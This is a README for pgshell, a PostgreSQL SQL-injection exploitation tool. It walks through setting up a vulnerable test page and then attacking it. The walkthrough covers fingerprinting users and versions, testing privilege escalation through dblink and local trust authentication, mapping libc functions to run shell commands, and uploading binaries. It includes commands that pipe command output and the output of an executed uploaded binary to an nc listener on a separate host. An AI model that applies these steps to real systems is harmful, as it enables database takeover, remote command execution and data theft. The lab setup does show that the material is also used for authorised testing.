# pgshell
A tool for exploiting SQL injections in PostgreSQL databases.

## Introduction

The pgshell Perl script exploits configuration weaknesses in the PostgreSQL database management system as they were discribed in the corresponding paper (Having Fun With PostgreSQL). It not only allows to gather target system and user information but also privilege escalation, executing of shell commands and uploading of binary files.

The general usage of pgshell could be outlined in three steps:

```
gathering information
creating the system and the upload framework
launching a shell and uploading files
```

The minimal parameters are the target host and a request file. The request file contains the HTTP request to send to the server plus a tag <<INJECTION>> that indicates, where to perform the SQL injection. A simple request file can look like this:

```
GET /index.php?id=1;<<INJECTION>> HTTP/1.0
```
If not stated otherwise, every execution of pgshell reads from and writes to a session file. This way, informations won't get lost and the process can be resumed at any time. Additional there are certain settings that can be made in order to work properly against the target system. If you wish to launch a shell or to upload files you need to know the path to the libc. Furthermore, for uploading files, pgshell creates a function which uses the libc function open. Two parameters are needed in order to successfully open a file. These values are the OR'ed (O_CREAT | O_APPEND | O_RDWR) and S_IRWXU. Find out, what values those will be on your target system and put everything in an initial session file:

```
=target.libc=/lib/libc.so.6
=target.flag.open=522
=target.flag.mode=448
```

### Setting up a test environment

pgshell comes with a shell script that will set up a test environment. That includes a database and a PHP script. Before you run that script, please make some changes in the script itself. First of all. specify the path of your PostgreSQL binaries. The TEMP_DIR variable determines the path into where the PHP script and a request file will be put. You need a PostgreSQL administrator user to create the test database. Put the username in DB_USER. The other variable settings are quite self explaining. After all, your script settings should look somehow like this:

```
BIN_DIR="/opt/postgresql/bin/"
TEMP_DIR="/tmp/test-env/"
DB_USER="pgsql"
TEST_USER="someone"
TEST_DBNAME="testdb"
TEST_TABLE="testtab"
```

Now, run it

```
$ ./test-env.sh
* generating test environment
  - creating temporary directory /tmp/test-env ... done
  - creating non-superuser someone ... done
  - creating database testdb ... done
  - creating table testtab ... done
  - creating php script ... done
  - creating HTTP request file ... done
* finished
	               
Please make sure, that 
   ... you have set up your web server to support php with PostgreSQL support
   ... you place /tmp/test-env//test-env.php in your web document root directory
   ... you disable magic quotes in your php.ini
```

When it finished without errors, move the test-env.php in /tmp/test-env/ into your web root. And then, depending where you moved it, edit the HTTP request file, so that it will be suite your requirements. The file will be /tmp/test-env/http-request:

```
$ cat /tmp/test-env/http-req
GET /test-env.php?id=1;<> HTTP/1.0 
```
 
Almost there. Just give it a try:
It should return a similar SQL syntax error message similar to that one below (Our target system is 192.168.1.158):

```
$ nc 192.168.1.158 80
GET /test-env.php?id=1;<<INJECTION>> HTTP/1.0

HTTP/1.1 200 OK
Server: Apache (FreeBSD)
Content-Length: 386
Connection: close
Content-Type: text/html


<html>
  <head>
    <title>pg_shell test page</title>
  </head>

  <br />

<b>Warning</b>:  pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  unterminated quoted string at or near "'" at character 39 in <b>/usr/local/www/apache22/data/test-env.php</b> on line <b>16</b><br />
```

That's it. Now, have fun with PostgreSQL

## Example Usage

### Information Gathering

This is the first phase, where we gather as many information as possible. That inherits user names, superuser names, database and system information. Certain information, like superuser names, are basicly needed for further steps. If this is prior PostgreSQL 8.2, we won't have the luxury of a pg_sleep() function. But if PL/pgSQL language is available, pgshell will create it's own. Otherwise, we have to fallback on using the md5()-workaround, what will result in heavy CPU usage on the target system. In that case, it won't make sense to run multithreaded as several threads might influence each other's delay time. That's why pgshell will trottle back to a single thread. However, let's assume, we can create PL/pgSQL functions:

```
./pgshell -v -gIvid -gSle -gUsa 192.168.1.158 request
pg_shell - The PostgreSQL Shell; Version 1.0
(c) 2007 Nico Leidecker 
http://www.portcullis.co.uk - http://www.leidecker.info
* target is '192.168.1.158:80' with request from 'request'
* read session file
! no session file found: No such file or directory
* running with 10 threads
* PostgreSQL Settings:
    listen addresses: localhost
    port: 5432
    password encryption: no
* General Informations: 
    version: PostgreSQL 8.1.8 on i386-unknown-freebsd6.2, compiled by GCC gcc (GCC) 3.4.6 [FreeBSD] 20060305
    who am I? someone
    where am I? testdb
* User Informations:
    users: 2
pgsql
someone
    super users: 1
pgsql
* write session file
```

### Check Your Privileges

The current user someone is not a superuser. That's not surprising. But it might be interesting, if we had other privileges:

```
$ ./pgshell -gP someone 192.168.1.158 request
* User Privileges for someone:
   is a super user ... no
   can create databases ... no
   can update system catalogs... no
```

### Check Privilege Escalation Capabilities

So, we are a very low privileged user. But there might be a chance to escalade our privileges by exploiting a configuration weakness. That is the local trust authentication that is enabled by default, if you compiled PostgreSQL from the sources. The first we do, is to test the target system on it's escalation capability:

```
$ ./pgshell -pT 192.168.1.158 request
* Testing privilege escalation capabilities:
    checking functions:
        dblink() ... found
        dblink_exec() ... found
        dblink_connect() ... found
    local trust authentication: possible
* congratulations, the target system is capable for privilege escalation
```

That looks good. We now are able to do anything we want, as we'd be able to gain superuser privileges.

### Create Shell and Upload Framework

Before running shell commands or uploading files, we need to map the necessary functions. Just execute the following command ...

```
$ ./pgshell -cSU 192.168.1.158 request
mapping system function ... testing ... done
mapping open function ... done
mapping close function ... done
mapping write function ... done
preparing writing routine ... done
```

... and enjoy the following :)

### Run Shell Commands

Launching a shell and running commands can be done with the -aS flag. Please consider, that pgshell won't return any output, but will determine, whether the system() function call will return with 0 or not. You still can get the output via piping it to a reverse connection for instance:

```
$ sudo nc -lp 4141 &
[1] 2650
$ ./pgshell -aS 192.168.1.158 request
(quit with ^C)
> id | nc 192.168.1.169 4141
uid=70(pgsql) gid=70(pgsql) groups=70(pgsql)
> ^C
[1]+  Done                    sudo nc -lp 4141
```

### Upload Files

pgshell is able to upload (binary) files by using Base64 encoding. The syntax for uploading a simple file is:

```
./pgshell -aU source-file destination-file target request-file
```

In the following, we compile a simple C program, upload and execute it and pipe the output back to us.

```
$ cat <<EOF > upload.c
#include <stdio.h>
int main()
{
	printf("this binary file has been uploaded!\n");
	return 0;
}
EOF
$ gcc -o upload upload.c
$ ./pgshell -aU upload /tmp/upload 192.168.1.158 request
* uploading upload to /tmp/upload ... 13344/13344 ... completed
$ ./pgshell -aS 192.168.1.158 request
(quit with ^C)
> /tmp/upload | nc 192.168.1.169 4141
this binary file has been uploaded!
> ^C      
[1]+  Done                    nc -lp 4141
```

